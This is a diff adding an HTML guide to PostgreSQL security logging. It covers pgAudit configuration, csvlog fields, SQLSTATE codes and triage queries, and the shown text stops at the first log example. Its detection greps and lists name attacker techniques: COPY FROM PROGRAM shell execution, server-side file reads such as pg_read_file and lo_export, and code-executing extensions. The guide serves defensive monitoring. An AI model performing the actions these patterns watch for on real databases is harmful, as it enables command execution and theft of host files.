@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <title>Hack The Logs - PostgreSQL Documentation</title>
+    <link rel="stylesheet" href="css/os.css">
+    <link href="https://fonts.googleapis.com/css2?family=Courgette&family=Prompt:wght@700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Anta&display=swap" rel="stylesheet">
+    <script src="js/Endpintcode.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
+  </head>
+  <body>
+    <!-- Sidebar -->
+    <div class="sidebar-overlay"></div>
+    <div class="sidebar">
+      <div class="logo">
+        <div class="logo-icon">H</div>
+        <div class="logo-text">Hack The Logs</div>
+      </div>
+      <div class="section-title">PostgreSQL Logs</div>
+      <a href="#overview" class="nav-item active">PostgreSQL Log Overview</a>
+      <a href="#log-types" class="nav-item">Key PostgreSQL Log Types</a>
+      <a href="#log-locations" class="nav-item">Log File Locations</a>
+      <a href="#enable-logging" class="nav-item">Configuring PostgreSQL Logging</a>
+      <a href="#pgaudit" class="nav-item">Recommended pgAudit Classes</a>
+      <a href="#log-format" class="nav-item">PostgreSQL Log Format</a>
+      <a href="#error-codes" class="nav-item">Critical PostgreSQL Error Codes</a>
+      <a href="#analysis-queries" class="nav-item">PostgreSQL Log Analysis Queries</a>
+      <a href="#best-practices" class="nav-item">Best Practices for PostgreSQL Logging</a>
+      <a href="#log-examples" class="nav-item">Common PostgreSQL Log Examples</a>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+      <div class="header">
+        <h1 class="page-title"> <i id="menuToggle" class="fas fa-bars"></i> PostgreSQL Logs</h1>
+        <div class="search-box">
+          <input type="text" placeholder="Search documentation...">
+        </div>
+      </div>
+
+      <!-- PostgreSQL Log Overview -->
+      <div id="overview" class="card event-log-overview">
+        <div class="card-header">
+          <div></div>
+          <h2>PostgreSQL Log Overview</h2>
+        </div>
+        <div class="content-wrapper">
+          <div class="overview-content">
+            <p>PostgreSQL writes everything (errors, warnings, connection events, slow queries, and audit records) into a single server log stream. What that stream contains is entirely determined by roughly a dozen parameters in <code>postgresql.conf</code>, and the defaults are deliberately conservative. Out of the box PostgreSQL logs errors and fatal conditions but not connections, not disconnections, and not a single successful statement. A default installation will happily record that authentication failed while telling you nothing about the session that succeeded and then read your entire customer table.</p>
+            <p>The log destination is equally configurable. <code>stderr</code> produces human-readable text, <code>csvlog</code> produces a strictly defined 23-column CSV that can be loaded straight into a table, and <code>jsonlog</code> (PostgreSQL 15 and later) produces one JSON object per event. For any environment feeding a SIEM, csvlog or jsonlog should be the choice: they eliminate the multi-line parsing problems that plague stderr output when a logged statement itself contains newlines.</p>
+            <p>For true auditing PostgreSQL relies on <code>pgAudit</code>, an extension that hooks the executor and emits structured AUDIT records classified by statement type. pgAudit distinguishes session auditing, which follows a role, from object auditing, which follows a table, and it records the statement text and parameters that the standard <code>log_statement</code> setting cannot express with the same precision. Together with <code>log_connections</code>, <code>log_disconnections</code>, and a well-designed <code>log_line_prefix</code>, pgAudit is what makes PostgreSQL logging satisfy the privileged-activity and sensitive-data requirements set out in NIST SP 800-92 and the Saudi NCA controls.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Key PostgreSQL Log Types -->
+      <div id="log-types" class="card event-log-locations">
+        <div class="card-header">
+          <div class="header-icon"></div>
+          <h2>Key PostgreSQL Log Types</h2>
+        </div>
+        <p>PostgreSQL has one physical log but several logical record types, each controlled by its own parameter. Knowing which parameter produces which record is what makes the configuration tractable:</p>
+        <div class="log-locations-table-container">
+          <table class="log-locations-table">
+            <thead>
+              <tr>
+                <th>Log Type</th>
+                <th>Description</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="log-type site-log">Server Log</td>
+                <td>The single output stream written by the logging collector. Carries startup and shutdown, checkpoints, autovacuum activity, errors, and every record type below. Available as stderr text, CSV, or JSON depending on log_destination.</td>
+              </tr>
+              <tr>
+                <td class="log-type error-log">pgAudit Records</td>
+                <td>Structured AUDIT entries emitted by the pgaudit extension, classified as READ, WRITE, FUNCTION, ROLE, DDL, or MISC. Includes the statement text and parameter values. The authoritative audit source for PostgreSQL.</td>
+              </tr>
+              <tr>
+                <td class="log-type virtualhost-log">Connection and Authentication Log</td>
+                <td>Produced by log_connections and log_disconnections. Records the client address, database, user, authentication method, and TLS parameters, plus session duration on disconnect. Disabled by default.</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-log">Statement Log</td>
+                <td>Controlled by log_statement, which accepts none, ddl, mod, or all. The ddl setting is a cheap, high-value baseline that records every schema and role change without logging read traffic.</td>
+              </tr>
+              <tr>
+                <td class="log-type config-log">Slow Query Log</td>
+                <td>Emitted when a statement exceeds log_min_duration_statement. Doubles as a security signal because bulk extraction and time-based blind injection are both slow by nature.</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-site-log">Write-Ahead Log (WAL)</td>
+                <td>The durability and replication stream. Not a security log and not human readable, but with tools such as pg_waldump or logical decoding it can reconstruct data changes that no audit configuration captured.</td>
+              </tr>
+              <tr>
+                <td class="log-type site-log">pg_stat_statements</td>
+                <td>An extension maintaining aggregated execution statistics per normalised query. Not an audit trail, but it reveals which query shapes are running and how much data they return, useful for spotting anomalous access patterns retroactively.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div>
+          <div class="tip-content">
+            <strong>Pro Tip:</strong> Setting <code>log_statement = 'all'</code> is not a substitute for pgAudit. It logs statements at parse time without knowing which objects were actually touched, misses statements executed inside functions, and provides no classification for filtering.
+          </div>
+        </div>
+      </div>
+
+      <!-- Log File Locations -->
+      <div id="log-locations" class="card">
+        <h2>Log File Locations</h2>
+        <p>The log directory depends on both the distribution and whether the logging collector is enabled. When PostgreSQL is started by systemd without the collector, output goes to the journal instead of a file.</p>
+        <div class="log-locations-table-container">
+          <table class="log-locations-table">
+            <thead>
+              <tr>
+                <th>Log</th>
+                <th>Default Location</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="log-type site-log">Server Log (Debian / Ubuntu)</td>
+                <td>/var/log/postgresql/postgresql-16-main.log</td>
+              </tr>
+              <tr>
+                <td class="log-type site-log">Server Log (RHEL / Rocky)</td>
+                <td>/var/lib/pgsql/16/data/log/postgresql-&lt;day&gt;.log</td>
+              </tr>
+              <tr>
+                <td class="log-type virtualhost-log">Server Log (source build)</td>
+                <td>$PGDATA/log/ when logging_collector is on, otherwise stderr of the postmaster</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-log">systemd Journal</td>
+                <td>journalctl -u postgresql@16-main when logging_collector is off</td>
+              </tr>
+              <tr>
+                <td class="log-type config-log">Main Configuration</td>
+                <td>/etc/postgresql/16/main/postgresql.conf or $PGDATA/postgresql.conf</td>
+              </tr>
+              <tr>
+                <td class="log-type error-log">Host-Based Authentication</td>
+                <td>/etc/postgresql/16/main/pg_hba.conf or $PGDATA/pg_hba.conf</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-site-log">WAL Segments</td>
+                <td>$PGDATA/pg_wal/</td>
+              </tr>
+              <tr>
+                <td class="log-type site-log">Windows</td>
+                <td>C:\Program Files\PostgreSQL\16\data\log\</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div>
+          <div class="tip-content">
+            <strong>Pro Tip:</strong> Ask the server rather than the filesystem. <code>SELECT pg_current_logfile();</code> returns the active log file, and <code>SHOW data_directory;</code> plus <code>SHOW log_directory;</code> resolve relative paths correctly.
+          </div>
+        </div>
+      </div>
+
+      <!-- Configuring PostgreSQL Logging -->
+      <div id="enable-logging" class="card">
+        <h2>Configuring PostgreSQL Logging</h2>
+        <p>Every setting below lives in <code>postgresql.conf</code>. Most take effect with a configuration reload; the ones marked otherwise require a restart.</p>
+
+        <div class="implementation-steps">
+          <h3>Step 1: Enable the Logging Collector and Choose a Destination</h3>
+          <div class="config-snippet">
+logging_collector  = on                    # requires restart
+log_destination    = 'csvlog'              # or 'jsonlog' on PostgreSQL 15+
+log_directory      = 'log'
+log_filename       = 'postgresql-%Y-%m-%d_%H%M%S.log'
+log_rotation_age   = 1d
+log_rotation_size  = 100MB
+log_file_mode      = 0600
+log_truncate_on_rotation = off             # never overwrite yesterday's evidence</div>
+          <div class="cmd-output">csvlog and jsonlog produce one parseable record per event even when the logged statement contains newlines, which is the single biggest reliability win for SIEM ingestion.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Step 2: Log Connections, Disconnections, and Context</h3>
+          <div class="config-snippet">
+log_connections     = on
+log_disconnections  = on
+log_hostname        = off                  # keep off: DNS lookups add latency per connection
+log_line_prefix     = '%m [%p] %q%u@%d %r %a '
+log_statement       = 'ddl'                # none | ddl | mod | all
+log_min_duration_statement = 1000          # log any statement over 1 second
+log_min_messages    = warning
+log_min_error_statement = error
+log_timezone        = 'UTC'</div>
+          <div class="cmd-output">The log_line_prefix escapes are: %m timestamp with milliseconds, %p process id, %u user, %d database, %r remote host and port, %a application name. Without a prefix, log lines cannot be attributed to a session.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Step 3: Install pgAudit</h3>
+          <div class="config-snippet">
+# postgresql.conf  (requires restart)
+shared_preload_libraries = 'pgaudit'
+
+-- then, in each database to be audited
+CREATE EXTENSION IF NOT EXISTS pgaudit;
+
+SELECT extname, extversion FROM pg_extension WHERE extname = 'pgaudit';</div>
+          <div class="cmd-output">pgaudit must be loaded at server start through shared_preload_libraries. Creating the extension without the preload silently produces no audit output.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Step 4: Configure Session Auditing</h3>
+          <div class="config-snippet">
+pgaudit.log                 = 'ddl, role, write, function'
+pgaudit.log_catalog         = off          # suppress noisy system catalog reads
+pgaudit.log_parameter       = on           # record bind parameter values
+pgaudit.log_relation        = on           # one entry per relation referenced
+pgaudit.log_statement_once  = off
+pgaudit.log_level           = log</div>
+          <div class="cmd-output">This class set captures schema changes, privilege and role changes, all data modifications, and function execution while omitting the very high volume READ class. Add read only for databases where it is affordable.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Step 5: Add Object Auditing for Sensitive Tables</h3>
+          <div class="config-snippet">
+-- Create a dedicated audit role and grant it on sensitive objects only
+CREATE ROLE auditor NOLOGIN;
+GRANT SELECT, INSERT, UPDATE, DELETE ON hr.employees   TO auditor;
+GRANT SELECT                        ON finance.payment_cards TO auditor;
+
+-- Tell pgAudit to audit anything that role could do
+ALTER SYSTEM SET pgaudit.role = 'auditor';
+SELECT pg_reload_conf();</div>
+          <div class="cmd-output">Object auditing works by proxy: pgAudit logs any operation that the named role has permission to perform. This lets you audit reads on two sensitive tables without enabling the READ class globally.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Step 6: Audit Privileged Roles Individually</h3>
+          <div class="config-snippet">
+-- Log everything a superuser or admin role does, without global overhead
+ALTER ROLE postgres  SET pgaudit.log = 'all';
+ALTER ROLE dba_admin SET pgaudit.log = 'all';
+ALTER ROLE app_rw    SET pgaudit.log = 'ddl, role, write';
+
+-- Verify per-role settings
+SELECT rolname, setconfig FROM pg_db_role_setting s
+JOIN pg_roles r ON r.oid = s.setrole;</div>
+          <div class="cmd-output">Per-role audit settings are the key to a sustainable configuration: full coverage on the handful of privileged identities, targeted coverage on application accounts.</div>
+        </div>
+
+        <div class="alert-warning">
+          <i class="fas fa-exclamation-triangle"></i>
+          <div>
+            <strong>Security Note:</strong> With <code>pgaudit.log_parameter = on</code>, bind values appear in the log, including passwords passed to functions and personal data in WHERE clauses. Set <code>log_file_mode = 0600</code>, restrict the log directory, and classify PostgreSQL logs at the same sensitivity level as the data they describe.
+          </div>
+        </div>
+      </div>
+
+      <!-- Recommended pgAudit Classes -->
+      <div id="pgaudit" class="card owasp-overview">
+        <div class="card-header">
+          <div class="header-icon"></div>
+          <h2>Recommended pgAudit Classes</h2>
+        </div>
+        <p class="description">pgAudit groups statements into six classes set through the pgaudit.log parameter. Choosing the right subset is the difference between a usable audit trail and an unreadable one.</p>
+        <div class="audit-categories-grid">
+          <div class="audit-category-box">
+            <div class="category-box-header">
+              <i class="fas fa-user-shield"></i>
+              <h4>ROLE</h4>
+            </div>
+            <table class="subcategory-table">
+              <tbody>
+                <tr>
+                  <td>Captures GRANT, REVOKE, CREATE ROLE, ALTER ROLE, and DROP ROLE. Every privilege escalation in PostgreSQL passes through this class. Very low volume.</td>
+                </tr>
+                <tr>
+                  <td>
+                    <span class="audit-success">Enable</span>
+                    <span class="audit-failure">Critical</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="audit-category-box">
+            <div class="category-box-header">
+              <i class="fas fa-table"></i>
+              <h4>DDL</h4>
+            </div>
+            <table class="subcategory-table">
+              <tbody>
+                <tr>
+                  <td>Records CREATE, ALTER, and DROP of any object, including extensions. Detects malicious extension installation and destructive schema changes. Low volume.</td>
+                </tr>
+                <tr>
+                  <td>
+                    <span class="audit-success">Enable</span>
+                    <span class="audit-failure">Critical</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="audit-category-box">
+            <div class="category-box-header">
+              <i class="fas fa-edit"></i>
+              <h4>WRITE</h4>
+            </div>
+            <table class="subcategory-table">
+              <tbody>
+                <tr>
+                  <td>Covers INSERT, UPDATE, DELETE, TRUNCATE, and COPY FROM. Moderate volume on transactional systems but essential for proving what data was altered.</td>
+                </tr>
+                <tr>
+                  <td>
+                    <span class="audit-success">Enable</span>
+                    <span class="audit-failure">High Risk</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="audit-category-box">
+            <div class="category-box-header">
+              <i class="fas fa-code"></i>
+              <h4>FUNCTION</h4>
+            </div>
+            <table class="subcategory-table">
+              <tbody>
+                <tr>
+                  <td>Logs function and DO block execution. Important because a SECURITY DEFINER function is a common privilege escalation and persistence mechanism in PostgreSQL.</td>
+                </tr>
+                <tr>
+                  <td>
+                    <span class="audit-success">Enable</span>
+                    <span class="audit-failure">High Risk</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="audit-category-box">
+            <div class="category-box-header">
+              <i class="fas fa-book-open"></i>
+              <h4>READ</h4>
+            </div>
+            <table class="subcategory-table">
+              <tbody>
+                <tr>
+                  <td>Covers SELECT and COPY TO. The highest volume class by a wide margin. Prefer object auditing through pgaudit.role over enabling this globally.</td>
+                </tr>
+                <tr>
+                  <td>
+                    <span class="audit-success">Tune</span>
+                    <span class="audit-success">Medium Risk</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <div class="audit-category-box">
+            <div class="category-box-header">
+              <i class="fas fa-ellipsis-h"></i>
+              <h4>MISC / MISC_SET</h4>
+            </div>
+            <table class="subcategory-table">
+              <tbody>
+                <tr>
+                  <td>Miscellaneous commands such as DISCARD, FETCH, CHECKPOINT, VACUUM, and SET. MISC_SET separately covers SET statements including role switching via SET ROLE.</td>
+                </tr>
+                <tr>
+                  <td>
+                    <span class="audit-success">Tune</span>
+                    <span class="audit-success">Medium Risk</span>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <div class="alert-warning">
+          <i class="fas fa-exclamation-triangle"></i>
+          <div>
+            <strong>Security Note:</strong> A superuser can change <code>pgaudit.log</code> for their own session with a plain <code>SET</code> and disable auditing of their own activity. Enable MISC_SET so that the act of changing the audit configuration is itself recorded, and alert on it.
+          </div>
+        </div>
+      </div>
+
+      <!-- PostgreSQL Log Format -->
+      <div id="log-format" class="card">
+        <h2>PostgreSQL Log Format</h2>
+        <p>The csvlog destination writes a fixed column order defined by the PostgreSQL documentation. These are the fields that carry security value and should be mapped into your SIEM schema.</p>
+        <div class="log-locations-table-container">
+          <table class="log-table">
+            <thead>
+              <tr>
+                <th>Field</th>
+                <th>Description</th>
+                <th>Category</th>
+                <th>Example Value</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>log_time</td>
+                <td>Timestamp with milliseconds and timezone</td>
+                <td>Timestamp</td>
+                <td>2025-07-14 09:41:22.481 UTC</td>
+              </tr>
+              <tr>
+                <td>user_name</td>
+                <td>Database role used for the session</td>
+                <td>Identity</td>
+                <td>app_rw</td>
+              </tr>
+              <tr>
+                <td>database_name</td>
+                <td>Database the session is connected to</td>
+                <td>Target</td>
+                <td>shopdb</td>
+              </tr>
+              <tr>
+                <td>process_id</td>
+                <td>Backend process identifier</td>
+                <td>Session</td>
+                <td>31882</td>
+              </tr>
+              <tr>
+                <td>connection_from</td>
+                <td>Client address and port</td>
+                <td>Source</td>
+                <td>10.30.2.61:52144</td>
+              </tr>
+              <tr>
+                <td>session_id</td>
+                <td>Unique session identifier</td>
+                <td>Session</td>
+                <td>6874a1b2.7c86</td>
+              </tr>
+              <tr>
+                <td>application_name</td>
+                <td>Client-supplied application name</td>
+                <td>Source</td>
+                <td>psql</td>
+              </tr>
+              <tr>
+                <td>error_severity</td>
+                <td>Message severity level</td>
+                <td>Severity</td>
+                <td>FATAL</td>
+              </tr>
+              <tr>
+                <td>sql_state_code</td>
+                <td>Five-character SQLSTATE code</td>
+                <td>Result</td>
+                <td>28P01</td>
+              </tr>
+              <tr>
+                <td>message</td>
+                <td>The log message or AUDIT record</td>
+                <td>Action</td>
+                <td>password authentication failed for user "postgres"</td>
+              </tr>
+              <tr>
+                <td>detail</td>
+                <td>Additional context for the message</td>
+                <td>Action</td>
+                <td>Connection matched pg_hba.conf line 96</td>
+              </tr>
+              <tr>
+                <td>query</td>
+                <td>The statement that produced the message</td>
+                <td>Action</td>
+                <td>SELECT * FROM customers</td>
+              </tr>
+              <tr>
+                <td>backend_type</td>
+                <td>Type of backend process</td>
+                <td>Metadata</td>
+                <td>client backend</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div>
+          <div class="tip-content">
+            <strong>Pro Tip:</strong> pgAudit records arrive inside the <code>message</code> field with the fixed prefix <code>AUDIT: SESSION,&lt;statement_id&gt;,&lt;substatement_id&gt;,&lt;class&gt;,&lt;command&gt;,&lt;object_type&gt;,&lt;object_name&gt;,&lt;statement&gt;,&lt;parameters&gt;</code>. Parse that inner CSV to get a fully structured audit event.
+          </div>
+        </div>
+      </div>
+
+      <!-- Critical PostgreSQL Error Codes -->
+      <div id="error-codes" class="card">
+        <h2>Critical PostgreSQL Error Codes</h2>
+        <p>PostgreSQL SQLSTATE codes are stable across versions, which makes them far more reliable detection anchors than message text.</p>
+        <div class="log-locations-table-container">
+          <table class="log-locations-table">
+            <thead>
+              <tr>
+                <th>SQLSTATE</th>
+                <th>Meaning</th>
+                <th>Why It Matters</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="log-type error-log">28P01</td>
+                <td>Invalid password</td>
+                <td>The primary failed-authentication code. Bursts from one address are brute force; one attempt across many roles is password spraying</td>
+              </tr>
+              <tr>
+                <td class="log-type error-log">28000</td>
+                <td>Invalid authorization specification</td>
+                <td>Includes "no pg_hba.conf entry for host", which reveals hosts probing the server from unauthorised networks</td>
+              </tr>
+              <tr>
+                <td class="log-type virtualhost-log">42501</td>
+                <td>Insufficient privilege</td>
+                <td>An authenticated session attempting actions beyond its grants, classic post-compromise privilege probing</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-log">42P01</td>
+                <td>Undefined table</td>
+                <td>In bursts this is object enumeration or blind SQL injection rather than an application bug</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-log">42601</td>
+                <td>Syntax error</td>
+                <td>Repeated syntax errors against a production application are the signature of injection payload fuzzing</td>
+              </tr>
+              <tr>
+                <td class="log-type config-log">3D000</td>
+                <td>Invalid catalog name</td>
+                <td>Connection attempts to databases that do not exist, indicating database name enumeration</td>
+              </tr>
+              <tr>
+                <td class="log-type site-log">53300</td>
+                <td>Too many connections</td>
+                <td>Resource exhaustion, whether from a connection leak or a deliberate denial of service</td>
+              </tr>
+              <tr>
+                <td class="log-type error-log">57P01 / 57P02</td>
+                <td>Admin shutdown / crash shutdown</td>
+                <td>Unexpected termination of the server, potentially anti-forensic or the result of exploitation</td>
+              </tr>
+              <tr>
+                <td class="log-type custom-site-log">XX001 / XX002</td>
+                <td>Data corrupted / index corrupted</td>
+                <td>Storage failure or direct tampering with data files outside the database process</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div>
+          <div class="tip-content">
+            <strong>Pro Tip:</strong> A FATAL 28000 with detail "no pg_hba.conf entry for host" means something reached the listening port from a network you never authorised. That is a network segmentation finding as much as a database one.
+          </div>
+        </div>
+      </div>
+
+      <!-- PostgreSQL Log Analysis Queries -->
+      <div id="analysis-queries" class="card">
+        <h2>PostgreSQL Log Analysis Queries</h2>
+        <p>Use these commands to extract authentication attacks, privilege changes, superuser abuse, and bulk extraction from PostgreSQL logs.</p>
+        <div class="cmd-grid">
+
+          <div class="cmd-card error">
+            <div class="cmd-header">
+              <i class="fas fa-user-lock"></i>
+              <span class="cmd-title">Failed Authentication by Source</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">bash></span>
+                <span class="cmd-line-content">grep "password authentication failed" /var/log/postgresql/*.log | grep -oP "host=\K[0-9.]+" | sort | uniq -c | sort -rn | head -20</span>
+              </div>
+              <div class="cmd-output">Ranks source addresses by failed authentication count. Requires log_connections to be enabled for the host detail to be present.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card error">
+            <div class="cmd-header">
+              <i class="fas fa-terminal"></i>
+              <span class="cmd-title">COPY FROM PROGRAM (RCE)</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">bash></span>
+                <span class="cmd-line-content">grep -iE "copy .*(from|to) program" /var/log/postgresql/*.log</span>
+              </div>
+              <div class="cmd-output">COPY FROM PROGRAM executes shell commands as the postgres OS user. Restricted to superusers and pg_execute_server_program members, and never legitimate in an application.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card error">
+            <div class="cmd-header">
+              <i class="fas fa-user-shield"></i>
+              <span class="cmd-title">Role and Privilege Changes</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">bash></span>
+                <span class="cmd-line-content">grep -E "AUDIT: SESSION,[0-9]+,[0-9]+,ROLE" /var/log/postgresql/*.log</span>
+              </div>
+              <div class="cmd-output">Isolates the pgAudit ROLE class, which contains every GRANT, REVOKE, and role creation on the instance.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card error">
+            <div class="cmd-header">
+              <i class="fas fa-crown"></i>
+              <span class="cmd-title">Superuser Grants</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">SQL></span>
+                <span class="cmd-line-content">SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolbypassrls, rolvaliduntil FROM pg_roles WHERE rolsuper OR rolcreaterole OR rolbypassrls ORDER BY rolname;</span>
+              </div>
+              <div class="cmd-output">Baseline this list and alert on any change. rolbypassrls is easy to miss and defeats row level security entirely.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card warning">
+            <div class="cmd-header">
+              <i class="fas fa-puzzle-piece"></i>
+              <span class="cmd-title">Dangerous Extensions</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">SQL></span>
+                <span class="cmd-line-content">SELECT extname, extowner::regrole, extnamespace::regnamespace FROM pg_extension WHERE extname IN ('plpythonu','plpython3u','plperlu','dblink','postgres_fdw','file_fdw');</span>
+              </div>
+              <div class="cmd-output">Untrusted procedural languages and foreign data wrappers permit code execution and outbound network access from inside the database.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card warning">
+            <div class="cmd-header">
+              <i class="fas fa-file-import"></i>
+              <span class="cmd-title">Server-Side File Access</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">bash></span>
+                <span class="cmd-line-content">grep -iE "pg_read_file|pg_read_binary_file|pg_ls_dir|lo_import|lo_export" /var/log/postgresql/*.log</span>
+              </div>
+              <div class="cmd-output">These superuser functions read arbitrary files from the database host, including pg_hba.conf and SSH keys.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card warning">
+            <div class="cmd-header">
+              <i class="fas fa-download"></i>
+              <span class="cmd-title">Bulk Extraction Candidates</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">SQL></span>
+                <span class="cmd-line-content">SELECT userid::regrole, calls, rows, rows/GREATEST(calls,1) AS rows_per_call, left(query,80) FROM pg_stat_statements WHERE rows &gt; 100000 ORDER BY rows DESC LIMIT 20;</span>
+              </div>
+              <div class="cmd-output">Surfaces query shapes returning very large row counts. Requires the pg_stat_statements extension.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card info">
+            <div class="cmd-header">
+              <i class="fas fa-plug"></i>
+              <span class="cmd-title">Active Sessions and Origins</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">SQL></span>
+                <span class="cmd-line-content">SELECT pid, usename, client_addr, application_name, backend_start, state, left(query,60) FROM pg_stat_activity WHERE backend_type = 'client backend' ORDER BY backend_start;</span>
+              </div>
+              <div class="cmd-output">Live view of who is connected from where and what they are running. The fastest triage step during an active incident.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card warning">
+            <div class="cmd-header">
+              <i class="fas fa-shield-alt"></i>
+              <span class="cmd-title">Unauthorised Network Probes</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">bash></span>
+                <span class="cmd-line-content">grep "no pg_hba.conf entry" /var/log/postgresql/*.log | grep -oP 'host "\K[0-9.]+' | sort | uniq -c | sort -rn</span>
+              </div>
+              <div class="cmd-output">Every hit is a host that reached the PostgreSQL port from a network that was never authorised to.</div>
+            </div>
+          </div>
+
+          <div class="cmd-card error">
+            <div class="cmd-header">
+              <i class="fas fa-ban"></i>
+              <span class="cmd-title">Audit Configuration Tampering</span>
+            </div>
+            <div class="cmd-content">
+              <div class="cmd-line">
+                <span class="cmd-prompt">SIEM></span>
+                <span class="cmd-line-content">source="postgres:csvlog" message="*pgaudit.log*" OR message="*ALTER SYSTEM*" OR message="*pg_reload_conf*" | table log_time, user_name, connection_from, message</span>
+              </div>
+              <div class="cmd-output">Detects a session changing its own audit level or rewriting server configuration. Should be alerted on, not reviewed weekly.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Best Practices -->
+      <div id="best-practices" class="card best-practices-card">
+        <div class="card-header">
+          <div></div>
+          <h2>Best Practices for PostgreSQL Logging</h2>
+        </div>
+        <p class="intro-text">Follow these practices to make PostgreSQL logs complete, parseable, and defensible:</p>
+        <div class="practices-container">
+          <div class="practice-item">
+            <div class="practice-number">01</div>
+            <div class="practice-content">
+              <h3>Use csvlog or jsonlog</h3>
+              <p>Default stderr output breaks whenever a logged statement contains a newline, producing broken events in the SIEM. A structured destination eliminates the entire class of parsing failure.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">02</div>
+            <div class="practice-content">
+              <h3>Turn On Connection Logging</h3>
+              <p>log_connections and log_disconnections are off by default. Without them there is no record of who connected, from where, or with which authentication method.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">03</div>
+            <div class="practice-content">
+              <h3>Set log_statement to ddl at Minimum</h3>
+              <p>Even without pgAudit, logging DDL captures every schema and role change at negligible cost. It is the cheapest meaningful improvement over the default configuration.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">04</div>
+            <div class="practice-content">
+              <h3>Design log_line_prefix Deliberately</h3>
+              <p>Include %m, %p, %u, %d, %r, and %a. Without user, database, and remote host in the prefix, log lines cannot be attributed to a session and are close to worthless.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">05</div>
+            <div class="practice-content">
+              <h3>Prefer Object Auditing to the READ Class</h3>
+              <p>Enabling pgaudit READ globally on a busy database produces volume nobody can consume. Use pgaudit.role to audit reads on the specific tables that hold regulated data.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">06</div>
+            <div class="practice-content">
+              <h3>Disable log_truncate_on_rotation</h3>
+              <p>With a time-based filename and truncation enabled, a restart can overwrite the previous log file entirely. Leave it off so evidence is never silently destroyed.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">07</div>
+            <div class="practice-content">
+              <h3>Protect the Log Files</h3>
+              <p>Set log_file_mode to 0600. With pgaudit.log_parameter enabled the logs contain bind values, which means they inherit the sensitivity of the data they describe.</p>
+            </div>
+          </div>
+          <div class="practice-item">
+            <div class="practice-number">08</div>
+            <div class="practice-content">
+              <h3>Log in UTC and Ship Off-Host</h3>
+              <p>Set log_timezone to UTC for reliable correlation, and forward logs continuously. A superuser can execute COPY TO PROGRAM and delete the local log directory outright.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Common PostgreSQL Log Examples -->
+      <div id="log-examples" class="card">
+        <h2>Common PostgreSQL Log Examples</h2>
+        <p>Representative log output showing how an attack against PostgreSQL progresses from probing to code execution.</p>
+
+        <div class="implementation-steps">
+          <h3>Failed Authentication (SQLSTATE 28P01)</h3>
+          <div class="config-snippet">
+2025-07-14 09:41:22.481 UTC [31882] postgres@postgres 203.0.113.44:52144 psql
+FATAL:  password authentication failed for user "postgres"
